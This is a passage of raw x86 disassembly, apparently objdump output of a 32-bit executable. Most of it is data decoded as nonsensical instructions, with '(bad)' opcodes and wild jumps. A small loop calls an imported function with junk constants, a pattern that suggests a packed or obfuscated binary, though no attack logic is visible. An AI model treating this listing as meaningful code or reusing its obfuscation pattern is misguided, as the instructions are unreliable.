  4047ad:	or     eax,0x9d5fc3a9
  4047b2:	sbb    eax,0xe9d8cbe5
  4047b7:	pushf  
  4047b8:	adc    esi,DWORD PTR [edi]
  4047ba:	repz mov ebx,0x12d4255
  4047c0:	aad    0x97
  4047c2:	mov    cl,0x97
  4047c4:	jns    0x40478a
  4047c6:	sbb    ebx,esi
  4047c8:	pmulhw mm3,QWORD PTR [edi]
  4047cb:	outs   dx,BYTE PTR ds:[esi]
  4047cc:	test   bh,al
  4047ce:	sub    DWORD PTR [edi+0x74],eax
  4047d1:	aad    0xcd
  4047d3:	retf   0xd99b
  4047d6:	sub    DWORD PTR [edi-0x5129b56b],ebp
  4047dc:	cli    
  4047dd:	in     eax,0x16
  4047df:	jge    0x4047d7
  4047e1:	retf   0x7311
  4047e4:	aaa    
  4047e5:	add    DWORD PTR [ebp-0x58c31dc6],edi
  4047eb:	rcl    DWORD PTR [ebp-0x61],cl
  4047ee:	push   edi
  4047ef:	jp     0x404832
  4047f1:	popa   
  4047f2:	cmc    
  4047f3:	jp     0x404860
  4047f5:	pop    esi
  4047f6:	scas   al,BYTE PTR es:[edi]
  4047f7:	pop    ebp
  4047f8:	inc    edx
  4047f9:	clc    
  4047fa:	xchg   ebx,eax
  4047fb:	out    dx,al
  4047fc:	fsubr  st(5),st
  4047fe:	je     0x40480e
  404800:	push   esp
  404801:	pop    esp
  404802:	sti    
  404803:	push   ss
  404804:	or     DWORD PTR [ebx],ecx
  404806:	cmp    ebx,DWORD PTR [edi-0x13]
  404809:	cmp    al,0xc4
  40480b:	sbb    BYTE PTR [esi-0xa],0x15
  40480f:	cmp    al,0xb5
  404811:	sub    ch,BYTE PTR [ebp+0x1d6f0cb2]
  404817:	inc    esi
  404818:	mov    dl,0x5f
  40481a:	bound  esi,QWORD PTR [esi-0x5af72f16]
  404820:	stos   DWORD PTR es:[edi],eax
  404821:	or     edi,edi
  404823:	les    esi,FWORD PTR [esp+esi*1+0x51a870db]
  40482a:	cwde   
  40482b:	inc    ebx
  40482c:	dec    eax
  40482d:	retf   
  40482e:	sbb    al,0x50
  404830:	loope  0x4047c1
  404832:	aad    0xf0
  404834:	nop
  404835:	fidiv  WORD PTR [ebx]
  404837:	ret    0x957
  40483a:	ja     0x404803
  40483c:	cmc    
  40483d:	cmp    al,0xff
  40483f:	pop    esp
  404840:	dec    eax
  404841:	dec    cl
  404843:	add    al,0x72
  404845:	(bad)  
  404846:	sub    BYTE PTR [edi+eiz*4],dl
  404849:	fwait
  40484a:	jns    0x4048aa
  40484c:	push   cs
  40484d:	and    DWORD PTR [edx],ecx
  40484f:	mov    esi,ds
  404851:	call   0x418dede1
  404856:	pop    ecx
  404857:	jo     0x4048ba
  404859:	in     al,0xdf
  40485b:	stc    
  40485c:	sub    BYTE PTR [eax-0x64],dh
  40485f:	mov    esp,0x9915e32a
  404864:	sahf   
  404865:	cmp    eax,0x974a6faa
  40486a:	daa    
  40486b:	xchg   DWORD PTR [bx+si-0x12f5],ebp
  404870:	loop   0x40489c
  404872:	lods   eax,DWORD PTR ds:[esi]
  404873:	in     eax,dx
  404874:	push   0xe02850b3
  404879:	sahf   
  40487a:	and    BYTE PTR ds:0x46988da8,ah
  404880:	out    0x6e,al
  404882:	dec    esi
  404883:	(bad)  
  404884:	jno    0x404839
  404886:	arpl   WORD PTR [esi],sp
  404888:	add    al,0xa6
  40488a:	call   0x40ea1a0e
  40488f:	push   0xa05e51d
  404894:	lock dec ecx
  404896:	out    dx,al
  404897:	pop    edi
  404898:	adc    DWORD PTR [eax-0x7a],esp
  40489b:	cmp    eax,0xefa7cb4c
  4048a0:	loopne 0x404832
  4048a2:	ins    BYTE PTR es:[edi],dx
  4048a3:	xchg   BYTE PTR [eax-0xe],dh
  4048a6:	(bad)  
  4048a7:	sahf   
  4048a8:	jmp    0x7d77702b
  4048ad:	mov    dh,0x52
  4048af:	jecxz  0x404853
  4048b1:	stos   BYTE PTR es:[edi],al
  4048b2:	(bad)  
  4048b3:	push   ss
  4048b4:	mov    ah,0x45
  4048b6:	push   es
  4048b7:	jae    0x404938
  4048b9:	mov    ecx,0xb5254e6
  4048be:	(bad)  
  4048bf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4048c0:	xchg   ebx,eax
  4048c1:	out    0xf9,eax
  4048c3:	loopne 0x4048f3
  4048c5:	shr    ebp,cl
  4048c7:	retf   0xeaaf
  4048ca:	rcl    BYTE PTR [ebx+0x44],1
  4048cd:	jle    0x404894
  4048cf:	jge    0x404924
  4048d1:	scas   eax,DWORD PTR es:[edi]
  4048d2:	fadd   DWORD PTR [ebx+0x36]
  4048d5:	lods   eax,DWORD PTR ds:[esi]
  4048d6:	adc    al,0x28
  4048d8:	fcmovu st,st(0)
  4048da:	shr    DWORD PTR [ebp+0x2c],cl
  4048dd:	mov    esi,0xf5629112
  4048e2:	push   ebp
  4048e3:	inc    edi
  4048e4:	mov    ebp,eax
  4048e6:	popa   
  4048e7:	jmp    0x1d5c:0xea1ac502
  4048ee:	int3   
  4048ef:	arpl   WORD PTR [ecx+0x60],sp
  4048f2:	xchg   BYTE PTR [eax],dl
  4048f4:	sub    al,0x1f
  4048f6:	lods   al,BYTE PTR ds:[esi]
  4048f7:	outs   dx,BYTE PTR ds:[esi]
  4048f8:	or     eax,0x4cf6e9cd
  4048fd:	imul   DWORD PTR [ecx-0x719561e2]
  404903:	stos   BYTE PTR es:[edi],al
  404904:	retf   
  404905:	dec    ebp
  404906:	fcom   DWORD PTR [edx]
  404908:	test   eax,0x2aaff567
  40490d:	xchg   DWORD PTR [esi-0x7d],esp
  404910:	ja     0x4048a0
  404912:	jae    0x40497e
  404914:	mov    bl,0xd3
  404916:	mov    ds:0x5eda0321,eax
  40491b:	test   BYTE PTR [ebx],cl
  40491d:	xchg   edi,eax
  40491e:	aas    
  40491f:	and    dl,BYTE PTR [ebp+eiz*1+0x4a113850]
  404926:	aas    
  404927:	jb     0x404931
  404929:	adc    al,0x32
  40492b:	dec    eax
  40492c:	inc    edx
  40492d:	mov    ds:0x561b0c73,eax
  404932:	jb     0x4048f0
  404934:	ins    BYTE PTR es:[edi],dx
  404935:	sub    ah,ch
  404937:	pop    ebp
  404938:	les    esi,FWORD PTR [edx+0x243afa8e]
  40493e:	jecxz  0x4048d3
  404940:	mov    al,ds:0x4fd20f0f
  404945:	jno    0x40495a
  404947:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404948:	outs   dx,DWORD PTR ds:[esi]
  404949:	dec    esp
  40494a:	add    DWORD PTR [ebx],eax
  40494c:	mov    al,ds:0x186e10a7
  404951:	into   
  404952:	cli    
  404953:	push   ebx
  404954:	mov    bh,0xde
  404956:	test   eax,0xa4a10cd7
  40495c:	mov    eax,ds:0x5b4bc69f
  404961:	jg     0x4048f3
  404963:	int    0x96
  404965:	pop    edx
  404966:	pop    ecx
  404967:	add    DWORD PTR ds:[edx+0x5461e210],ebx
  40496e:	xchg   ebp,eax
  40496f:	in     eax,0xa0
  404971:	and    al,0xd3
  404973:	add    DWORD PTR [ebx+0x64da4902],0x44
  40497a:	jns    0x4049f5
  40497c:	sbb    ch,BYTE PTR [eiz*1-0x2f13d9ae]
  404983:	dec    edi
  404984:	xlat   BYTE PTR ds:[ebx]
  404985:	in     eax,0x25
  404987:	mov    al,0x25
  404989:	push   ecx
  40498a:	sbb    BYTE PTR [esi+0x15c402a0],bh
  404990:	retf   
  404991:	push   es
  404992:	mov    si,0x2711
  404996:	mov    WORD PTR [eax],ss
  404998:	mov    ch,0x80
  40499a:	and    BYTE PTR [esi+0x61],bl
  40499d:	jo     0x4049eb
  40499f:	cs stos BYTE PTR es:[edi],al
  4049a1:	pop    ss
  4049a2:	cmp    eax,0x994ef096
  4049a7:	sbb    al,0xf6
  4049a9:	sahf   
  4049aa:	lods   al,BYTE PTR ds:[esi]
  4049ab:	fwait
  4049ac:	push   ebp
  4049ad:	push   es
  4049ae:	lock aaa 
  4049b0:	int3   
  4049b1:	sbb    ah,BYTE PTR [ecx-0x36]
  4049b4:	enter  0xbc5d,0x9e
  4049b8:	sti    
  4049b9:	cmp    eax,0x6dd97f8f
  4049be:	cs call 0xa809:0xe7f64295
  4049c6:	dec    eax
  4049c7:	imul   eax,DWORD PTR [ebp-0x418e84f0],0x4f
  4049ce:	(bad)  
  4049cf:	iret   
  4049d0:	scas   al,BYTE PTR es:[edi]
  4049d1:	mov    ds:0x66385aca,eax
  4049d6:	std    
  4049d7:	scas   al,BYTE PTR es:[edi]
  4049d8:	mov    ebx,0xdd060c0c
  4049dd:	mov    ch,0xb5
  4049df:	lahf   
  4049e0:	mov    ecx,0x8e5bd7a1
  4049e5:	push   esi
  4049e6:	xor    eax,0x273e1c3b
  4049eb:	mov    al,0x68
  4049ed:	loopne 0x4049c4
  4049ef:	push   cs
  4049f0:	aam    0x1d
  4049f2:	bound  edx,QWORD PTR [ecx+0x41]
  4049f5:	outs   dx,BYTE PTR ds:[esi]
  4049f6:	xor    eax,0xce183304
  4049fb:	fisttp DWORD PTR [edi+0x5e19821c]
  404a01:	xchg   edx,eax
  404a02:	ss je  0x404a3c
  404a05:	jae    0x404a5c
  404a07:	int3   
  404a08:	pop    esp
  404a09:	pushf  
  404a0a:	call   ebx
  404a0c:	int3   
  404a0d:	and    DWORD PTR [esi+0x3a],edi
  404a10:	pop    esi
  404a11:	push   ss
  404a12:	sub    bh,BYTE PTR [esi+0x72b65698]
  404a18:	das    
  404a19:	adc    BYTE PTR ds:0x42ca1fb6,cl
  404a1f:	mov    esi,0xb55af3b4
  404a24:	sbb    DWORD PTR [eax-0x7d],0x55
  404a28:	dec    edi
  404a29:	mov    bh,0x85
  404a2b:	mov    eax,ds:0x22920b7f
  404a30:	xchg   ebp,eax
  404a31:	jecxz  0x4049c0
  404a33:	sbb    dh,BYTE PTR [ecx+ebx*8+0x8]
  404a37:	ficom  WORD PTR [ebx+0x21]
  404a3a:	or     eax,0x5de7c428
  404a3f:	fmul   st,st(2)
  404a41:	pop    ebp
  404a42:	and    BYTE PTR [edx-0x5ad2d57d],dl
  404a48:	(bad)  
  404a49:	call   0x850:0xb99ba98c
  404a50:	push   ecx
  404a51:	pop    es
  404a52:	and    DWORD PTR ds:0x42aa99,0x0
  404a5c:	mov    esi,DWORD PTR ds:0x42aa99
  404a62:	inc    esi
  404a63:	mov    DWORD PTR ds:0x42aa99,esi
  404a69:	cmp    DWORD PTR ds:0x42aa99,0xd
  404a70:	jne    0x404a9d
  404a76:	push   DWORD PTR [ebp-0x28]
  404a79:	push   0x69d2
  404a7e:	push   0x518b
  404a83:	push   0x83d6
  404a88:	push   0x4eb7
  404a8d:	push   0x680f
  404a92:	push   0x7bad
  404a97:	call   DWORD PTR ds:0x41d188
  404a9d:	cmp    DWORD PTR ds:0x42aa99,0xc
  404aa4:	jne    0x404ab7
  404aaa:	mov    esi,DWORD PTR ds:0x42aa99
  404ab0:	inc    esi
  404ab1:	mov    DWORD PTR ds:0x42aa99,esi
  404ab7:	cmp    DWORD PTR ds:0x42aa99,0x16
  404abe:	jb     0x404a5c
  404ac4:	xor    edx,ecx
  404ac6:	sub    esi,DWORD PTR ds:0x42aa5d
  404acc:	mov    esi,0x327298
  404ad1:	jmp    0x404dc1
  404ad6:	enter  0xc53c,0xd1
  404ada:	(bad)  
  404adc:	aam    0xc1
  404ade:	mov    ah,0xf9
  404ae0:	int3   
  404ae1:	push   edx
  404ae2:	dec    ebp
  404ae3:	sar    DWORD PTR [edi+eax*1+0x78782e46],cl
  404aea:	dec    ebp
  404aeb:	jle    0x404b65
  404aed:	js     0x404af3
  404aef:	inc    eax
  404af0:	mov    edi,DWORD PTR [edi+0x580e86cd]
  404af6:	popa   
  404af7:	pop    edx
  404af8:	cmp    DWORD PTR es:[edi-0x5a],ecx
  404afc:	inc    esi
  404afd:	jns    0x404b13
  404aff:	push   eax
  404b00:	outs   dx,DWORD PTR ds:[esi]
  404b01:	std    
  404b02:	mov    ?,WORD PTR [eax]
  404b04:	imul   BYTE PTR [edx-0x667affed]
  404b0a:	in     al,dx
  404b0b:	dec    esp
  404b0c:	repnz push cs
  404b0e:	sbb    eax,0x62c79ca5
  404b13:	pop    edx
  404b14:	out    0x28,eax
  404b16:	pop    ebp
  404b17:	inc    esp
  404b18:	js     0x404abe
  404b1a:	sbb    DWORD PTR [ecx-0x31024025],esi
  404b20:	mov    WORD PTR [eax-0x538ef5bb],?
  404b26:	clc    
  404b27:	aad    0xf3
  404b29:	out    dx,al
  404b2a:	inc    eax
  404b2b:	and    bh,BYTE PTR [edi]
  404b2d:	outs   dx,DWORD PTR ds:[esi]
  404b2e:	inc    edx
  404b2f:	dec    eax
  404b30:	adc    ecx,DWORD PTR [ecx+0x6]
  404b33:	xor    al,0x5a
  404b35:	add    edx,DWORD PTR ss:[ecx+0x5b455e5]
  404b3c:	sub    ch,BYTE PTR [ecx-0x33]
  404b3f:	xchg   BYTE PTR [eax-0x5d],bh
  404b42:	push   edx
  404b43:	lods   al,BYTE PTR ds:[esi]
  404b44:	cmp    ecx,DWORD PTR [eax-0x6721cd7e]
  404b4a:	(bad)  
  404b4b:	dec    edx
  404b4c:	mov    cl,0x3d
  404b4e:	sub    al,0x6c
  404b50:	nop
  404b51:	dec    ecx
  404b52:	test   esp,ebp
  404b54:	stos   BYTE PTR es:[edi],al
  404b55:	cld    
  404b56:	not    DWORD PTR [eax]
  404b58:	inc    esi
  404b59:	or     BYTE PTR [edx+0x44],ah
  404b5c:	pop    esi
  404b5d:	clc    
  404b5e:	cmc    
  404b5f:	and    DWORD PTR [edx+ecx*4],esi
  404b62:	(bad)  
  404b63:	fsub   st,st(1)
  404b65:	ds mov eax,0x8bdad743
  404b6b:	fcmove st,st(6)
  404b6d:	add    bl,bh
  404b6f:	mov    dl,0xbf
  404b71:	and    eax,0x543eed91
  404b76:	jo     0x404b94
  404b78:	jg     0x404bc1
  404b7a:	push   ecx
  404b7b:	jp     0x404b63
  404b7d:	jmp    0x404b15
  404b7f:	and    cl,BYTE PTR [eax+0x17]
  404b82:	clc    
  404b83:	dec    esi
  404b84:	ror    DWORD PTR [eax],0xe0
  404b87:	adc    DWORD PTR [ecx],0x9faffc11
  404b8d:	lahf   
  404b8e:	xchg   BYTE PTR [edx],dh
  404b90:	cmp    DWORD PTR [edi+0x3275837f],edi
  404b96:	push   ds
  404b97:	xchg   edx,eax
  404b98:	pop    es
  404b99:	call   0xbf7814e7
  404b9e:	mov    BYTE PTR [ebp-0x531c4960],ch
  404ba4:	jmp    0x404b74
  404ba6:	and    eax,0x4abb6409
  404bab:	stos   DWORD PTR es:[edi],eax
  404bac:	xchg   esp,eax
  404bad:	scas   eax,DWORD PTR es:[edi]
  404bae:	ja     0x404c14
  404bb0:	fdivr  QWORD PTR [ebx+0x36142985]
  404bb6:	test   DWORD PTR [esi+esi*1+0x7fa5d37a],0xbdc0095f
  404bc1:	imul   ebp,DWORD PTR [ecx-0x4a],0xfffffffb
  404bc5:	arpl   WORD PTR [edi],ax
  404bc7:	xchg   ecx,eax
  404bc8:	cmp    eax,0xf8d91b07
  404bcd:	push   ds
  404bce:	xchg   ebx,eax
  404bcf:	and    BYTE PTR [edi-0x6a41137a],dh
  404bd5:	(bad)  
  404bd6:	mov    edx,0xc1408e1e
  404bdb:	push   es
  404bdc:	xor    al,0xc1
  404bde:	int    0x66
  404be0:	stos   BYTE PTR es:[edi],al
  404be1:	pop    ds
  404be2:	sbb    dl,BYTE PTR [eax+0x79137d8e]
  404be8:	inc    edx
  404be9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404bea:	sbb    eax,0x96f191b4
  404bef:	mov    ds:0x5951c2d2,al
  404bf4:	gs call 0xf29b24ad
  404bfa:	int3   
  404bfb:	jo     0x404bcc
  404bfd:	les    ebp,FWORD PTR [ebx-0x1f6a6fa4]
  404c03:	mov    BYTE PTR [edx],ah
  404c05:	ret    0x77d0
  404c08:	push   0x45
  404c0a:	jae    0x404c1d
  404c0c:	dec    edx
  404c0d:	mov    bl,0xb9
  404c0f:	xchg   edi,eax
  404c10:	xchg   ch,ch
  404c12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404c13:	call   0xcfe39684
  404c18:	enter  0x16f5,0x9f
  404c1c:	mov    ds:0x8cb0820d,eax
  404c21:	fimul  WORD PTR [ebx]
  404c23:	push   eax
  404c24:	repz popf 
  404c26:	div    DWORD PTR [eax+eax*1-0x57]
  404c2a:	ds jmp 0x328358d3
  404c30:	jl     0x404be7
  404c32:	push   0xe23a9fc3
  404c37:	inc    al
  404c39:	jns    0x404ca7
  404c3b:	(bad)  
  404c3c:	retf   
  404c3d:	addr16 or eax,0x7c281c2a
  404c43:	sub    al,0xb9
  404c45:	jns    0x404c25
  404c47:	(bad)  
  404c48:	int    0xb
  404c4a:	push   ds
  404c4b:	jae    0x404ca5
  404c4d:	push   dx
  404c4f:	pop    ds
  404c50:	inc    edi
  404c51:	or     al,0x21
  404c53:	xchg   ebx,eax
  404c54:	hlt    
  404c55:	mov    bh,0xb6
  404c57:	mov    al,0x83
  404c59:	sar    DWORD PTR [ecx],0x8b
  404c5c:	ja     0x404cd7
  404c5e:	ins    DWORD PTR es:[edi],dx
  404c5f:	pop    es
  404c60:	xor    ah,BYTE PTR [esi-0x71096597]
  404c66:	test   ecx,0xdbb83ffa
  404c6c:	ja     0x404caa
  404c6e:	int    0x84
  404c70:	inc    ecx
  404c71:	sar    BYTE PTR [esi-0x3f0e731e],1
  404c77:	test   al,0xf5
  404c79:	repz mov ch,BYTE PTR [edx+0x9ad505c]
  404c80:	or     ch,BYTE PTR [ebx-0x4b3de796]
  404c86:	fbstp  TBYTE PTR [eax-0x42]
  404c89:	imul   esp,esp,0x58
  404c8c:	aas    
  404c8d:	(bad)  
  404c8e:	aas    
  404c8f:	cmp    BYTE PTR [ebx+0x2c4da474],cl
  404c95:	xor    esi,esi
  404c97:	sbb    eax,0xb59ac7bc
  404c9c:	(bad)  
  404c9d:	and    DWORD PTR [ecx+eiz*4-0x4a04d165],eax
  404ca4:	arpl   ax,sp
  404ca6:	test   DWORD PTR [esi],ecx
  404ca8:	mov    edx,0xac694735
  404cad:	push   0x8e88f0c4
  404cb2:	dec    eax
  404cb3:	mov    al,ds:0xbdafb2
  404cb8:	int    0x35
  404cba:	popa   
  404cbb:	out    dx,al
  404cbc:	imul   eax,ebp,0x60dec46f
  404cc2:	mov    ch,0x5d
  404cc4:	in     al,dx
  404cc5:	ja     0x404d34
  404cc7:	(bad)  
  404cc8:	sub    BYTE PTR [ebx+eiz*8+0x28],ch
  404ccc:	fstp   TBYTE PTR [esi]
  404cce:	test   dh,0xd8
  404cd1:	test   DWORD PTR [ebx+0x596c8fb7],ebp
  404cd7:	jno    0x404ce0
  404cd9:	sbb    al,0x9
  404cdb:	xlat   BYTE PTR ds:[ebx]
  404cdc:	xlat   BYTE PTR ds:[ebx]
  404cdd:	add    al,0x46
  404cdf:	outs   dx,BYTE PTR ds:[esi]
  404ce0:	mov    al,ds:0x4c8575e4
  404ce5:	out    dx,al
  404ce6:	mov    ?,esp
  404ce8:	cwde   
  404ce9:	cmc    
  404cea:	push   esi
  404ceb:	inc    edi
  404cec:	mov    cl,BYTE PTR [ebx-0x32]
  404cef:	hlt    
  404cf0:	xor    DWORD PTR [eax+0x35],edx
  404cf3:	push   0xddfe3e9a
  404cf8:	push   esi
  404cf9:	fld    QWORD PTR [edx+0x42]
  404cfc:	fnstcw WORD PTR [ebx]
  404cfe:	mov    dl,0x89
  404d00:	ror    ebx,0x55
  404d03:	pop    eax
  404d04:	sti    
  404d05:	add    al,0xf8
  404d07:	nop
  404d08:	inc    edx
  404d09:	(bad)  
  404d0a:	hlt    
  404d0b:	fcomi  st,st(7)
  404d0d:	adc    eax,0xce3d3363
  404d12:	in     al,dx
  404d13:	jg     0x404d66
  404d15:	xor    ah,bl
  404d17:	sbb    DWORD PTR [ebx],ebx
  404d19:	dec    edx
  404d1a:	mov    ecx,0x8715b525
  404d1f:	sub    BYTE PTR [ecx+0x5e887b35],0x93
  404d26:	mov    al,0x9b
  404d28:	fwait
  404d29:	inc    ecx
  404d2a:	or     eax,0x603820ae
  404d2f:	jmp    0x404d2d
  404d31:	and    dl,bh
  404d33:	pop    edx
  404d34:	sbb    al,0x11
  404d36:	pop    eax
  404d37:	mov    eax,0x94d679a5
  404d3c:	mov    DWORD PTR [ebx],esp
  404d3e:	pop    esp
  404d3f:	std    
  404d40:	sub    eax,eax
  404d42:	sar    DWORD PTR [edi-0x5a],1
  404d45:	xor    BYTE PTR [edi],0x4d
  404d48:	jecxz  0x404cdd
  404d4a:	out    0xdd,eax
  404d4c:	bnd jg 0x404d0e
  404d4f:	arpl   WORD PTR [edx+0x1aec4a9d],bp
  404d55:	jb     0x404d6e
  404d57:	cli    
  404d58:	mov    ebx,0x94f7ac23
  404d5d:	mov    ebx,0xb359ba37
  404d62:	dec    esi
  404d63:	xchg   ebx,eax
  404d64:	and    eax,0x4f1bf084
  404d69:	call   0x9e9c7efc
  404d6e:	adc    edx,DWORD PTR [edi-0x123bd83e]
  404d74:	pop    esp
  404d75:	mov    dh,0xaa
  404d77:	sub    eax,0xf37ee43b
  404d7c:	mov    cl,0xc
  404d7e:	and    BYTE PTR [edi],bl
  404d80:	jae    0x404d3d
  404d82:	bound  eax,QWORD PTR [edi+ecx*8-0x4317c0e6]
  404d89:	shl    BYTE PTR [edx-0x46],cl
  404d8c:	jo     0x404df5
  404d8e:	adc    DWORD PTR [edi-0x20b61680],0x60b02f5
  404d98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404d99:	imul   ecx,DWORD PTR [edi],0x63c7d057
  404d9f:	xchg   BYTE PTR [edi+0x40],dh
  404da2:	push   ebx
  404da3:	ficomp DWORD PTR [edi]
  404da5:	cmc    
  404da6:	(bad)  
  404da7:	sub    eax,0xa93e1810
  404dac:	and    BYTE PTR [edi+esi*1],dl
  404daf:	push   0xa0ea4b9f
  404db4:	cmp    BYTE PTR [edx-0x72ea5130],al
  404dba:	(bad)  [ecx+0x343c0ec7]
  404dc0:	mov    DWORD PTR [edi-0x75],edx
  404dc3:	jge    0x404dd5
  404dc5:	add    edx,esi
  404dc7:	cmp    edi,edx
  404dc9:	je     0x405a02
  404dcf:	mov    edx,DWORD PTR [ebp-0x8]
  404dd2:	mov    eax,DWORD PTR [ebp-0x4]
  404dd5:	xor    eax,ecx
  404dd7:	jmp    0x4050c7
  404ddc:	(bad)
  404ddf:	rcl    cl,0xd4
  404de2:	leave  
  404de3:	aad    0x26
  404de5:	xor    dh,BYTE PTR [esp+edx*2]
  404de8:	pusha  
  404de9:	out    0xa9,eax
  404deb:	pop    ds
  404dec:	fwait
  404ded:	xor    edi,DWORD PTR [eax+0x78]
  404df0:	dec    ebp
  404df1:	jle    0x404e6b
  404df3:	js     0x404e00
  404df5:	jbe    0x404dcd
  404df7:	push   cs
  404df8:	repz test eax,0x50401ac8
  404dfe:	sbb    DWORD PTR [esi+ecx*2-0x64],ebp
  404e02:	add    BYTE PTR [ecx-0x10],cl
  404e05:	test   al,0x6
  404e07:	daa    
  404e08:	popf   
  404e09:	cmp    esi,ecx
  404e0b:	loopne 0x404de8
  404e0d:	add    ebp,ecx
  404e0f:	xor    ebp,esp
  404e11:	jnp    0x404d9e
  404e13:	sub    esp,esi
  404e15:	inc    esp
  404e16:	push   0xffffff91
  404e18:	in     eax,0x95
  404e1a:	and    DWORD PTR [eax+0x1c],ebp
  404e1d:	sbb    DWORD PTR [ebp-0x55c7a278],0x12
  404e24:	cmp    DWORD PTR [edi+0x52],edi
  404e27:	dec    edx
  404e28:	pushf  
  404e29:	sbb    esp,DWORD PTR [ecx+0x466a6901]
  404e2f:	js     0x404e06
  404e31:	sbb    DWORD PTR [esi+edi*2+0x54],esi
  404e35:	add    eax,0x4cda3474
  404e3a:	ja     0x404e18
  404e3c:	xor    BYTE PTR [ebx+0x39209cf8],0xe1
  404e43:	mov    dl,0x78
  404e45:	sbb    bh,cl
  404e47:	into   
  404e48:	cmp    al,0x83
  404e4a:	adc    DWORD PTR [ebp+0x17],ecx
  404e4d:	test   ebx,0x5808b778
  404e53:	popf   
  404e54:	imul   esp,DWORD PTR [ecx-0x27115347],0x30a4a82
  404e5e:	sbb    ecx,DWORD PTR [ecx+esi*2]
  404e61:	jl     0x404e0d
  404e63:	mov    bh,0xdb
  404e65:	icebp  
  404e66:	xlat   BYTE PTR ds:[ebx]
  404e67:	outs   dx,DWORD PTR ds:[esi]
  404e68:	stos   BYTE PTR es:[edi],al
  404e69:	and    al,0x90
  404e6b:	mov    esi,gs
  404e6d:	div    BYTE PTR [eax-0x770e67c]
  404e73:	sub    DWORD PTR [ebx+0x76],ebp
  404e76:	mov    edi,0x8dd8c34b
  404e7b:	outs   dx,BYTE PTR ds:[esi]
  404e7c:	dec    eax
  404e7d:	mov    ah,0xc
  404e80:	sub    al,0xd8
  404e82:	icebp  
  404e83:	mov    esi,DWORD PTR [ebp+eiz*1+0x1e55e8fd]
  404e8a:	push   ecx
  404e8b:	jae    0x404e51
  404e8d:	pop    ecx
  404e8e:	mov    al,0x14
  404e90:	sub    bl,ch
  404e92:	outs   dx,BYTE PTR ds:[esi]
  404e93:	sar    DWORD PTR [edx-0x57],1
  404e96:	push   ss
  404e97:	mov    ebp,0xd0ffe66e
  404e9c:	ss pop ebx
  404e9e:	(bad)  
  404e9f:	push   ecx
  404ea0:	push   esi
  404ea1:	xor    DWORD PTR fs:[ecx],0x5c
  404ea5:	cld    
  404ea6:	fstp   TBYTE PTR [edi+0x78d5b4]
  404eac:	retf   0xf507
  404eaf:	mov    bh,0x1a
  404eb1:	cmc    
  404eb2:	mov    al,ds:0xa404eaf4
  404eb7:	das    
  404eb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404eb9:	add    bh,BYTE PTR [edx+0x45098e1d]
  404ebf:	loopne 0x404ea0
  404ec1:	(bad)  
  404ec2:	jmp    0x170a8495
  404ec7:	inc    ecx
  404ec8:	mov    ch,0xaf
  404eca:	imul   eax,edx,0x1d1463f2
  404ed0:	sbb    bl,BYTE PTR [edi]
  404ed2:	push   ebp
  404ed3:	cmp    eax,0x4920cca
  404ed8:	xchg   ebp,eax
  404ed9:	into   
  404eda:	ja     0x404f46
  404edc:	dec    DWORD PTR [esi+0x49]
  404edf:	xchg   edi,eax
  404ee0:	mov    ecx,0x74e0d5dd
  404ee5:	or     DWORD PTR [ebp+0x2de87e96],edx
  404eeb:	popf   
  404eec:	stos   DWORD PTR es:[edi],eax
  404eed:	pop    esi
  404eee:	dec    ecx
  404eef:	out    dx,al
  404ef0:	add    al,0x48
  404ef2:	fwait
  404ef3:	mov    esp,0x2eeff4d2
  404ef8:	xchg   esp,eax
  404ef9:	std    
  404efa:	dec    edi
  404efb:	push   es
  404efc:	pop    ebp
  404efd:	pop    edx
  404efe:	sbb    ah,dh
  404f00:	and    bl,bh
  404f02:	std    
  404f03:	mov    bh,0xf8
  404f05:	mov    DWORD PTR [esi-0x6211adec],ebx
  404f0b:	lahf   
  404f0c:	mov    esp,0xc223df67
  404f11:	mov    eax,DWORD PTR [ebx]
  404f13:	repz xchg edx,eax
  404f15:	hlt    
  404f16:	nop
  404f17:	xchg   bx,ax
  404f19:	dec    ebp
  404f1a:	inc    esi
  404f1b:	push   edi
  404f1c:	not    BYTE PTR [ecx-0x394f27d]
  404f22:	xor    al,0xe0
  404f24:	cmp    ebp,DWORD PTR [edi+0x2f5690d3]
  404f2a:	int3   
  404f2b:	xchg   esp,eax
  404f2c:	loopne 0x404ecc
  404f2e:	jb     0x404f0c
  404f30:	nop
  404f31:	loope  0x404fa8
  404f33:	repnz mov edi,0xa2f9561a
  404f39:	test   eax,0xe787db28
  404f3e:	jl     0x404f41
  404f40:	mov    al,0x55
  404f42:	fsub   DWORD PTR [ebx+0xaf1b92d]
  404f48:	cld    
  404f49:	jb     0x404f97
  404f4b:	pop    edi
  404f4c:	inc    esp
  404f4d:	jb     0x404f7d
  404f4f:	mov    al,0x30
  404f51:	loop   0x404f4f
  404f53:	pop    esi
  404f54:	sbb    al,0x36
  404f56:	rcl    DWORD PTR [esi],cl
  404f58:	inc    eax
  404f59:	ja     0x404fd0
  404f5b:	pop    ss
  404f5c:	xor    DWORD PTR [ecx+0x36],esi
  404f5f:	add    edx,DWORD PTR [ebp-0x79]
  404f62:	(bad)  
  404f63:	out    0xf1,eax
  404f65:	cli    
  404f66:	call   0x7d510e43
  404f6b:	xor    DWORD PTR ds:0x4e62d625,edx
  404f71:	jg     0x404f07
  404f73:	push   ds
  404f74:	aam    0x69
  404f76:	push   esp
  404f77:	pop    ebp
  404f78:	pusha  
  404f79:	or     eax,esp
  404f7b:	mov    edx,0xd1bdb52d
  404f80:	ret    
  404f81:	mov    eax,ds:0x5ccba3c0
  404f86:	push   ss
  404f87:	daa    
  404f88:	push   esp
  404f89:	(bad)  
  404f8a:	jmp    0x404fd2
  404f8c:	cmc    
  404f8d:	cmp    BYTE PTR [esi+0x151e7952],0xed
  404f94:	iret   
  404f95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404f96:	inc    ebp
  404f97:	jg     0x404f88
  404f99:	in     eax,0xe7
  404f9b:	rcr    DWORD PTR [esp+ebx*4],1
  404f9e:	retf   0xdc66
  404fa1:	sbb    eax,0x26dd76b3
  404fa6:	inc    edx
  404fa7:	xchg   ebp,eax
  404fa8:	(bad)  
  404fa9:	frstor [eax-0x7]
  404fac:	call   0xb67a63c1
  404fb1:	ins    DWORD PTR es:[edi],dx
  404fb2:	sbb    al,0x79
  404fb4:	dec    ecx
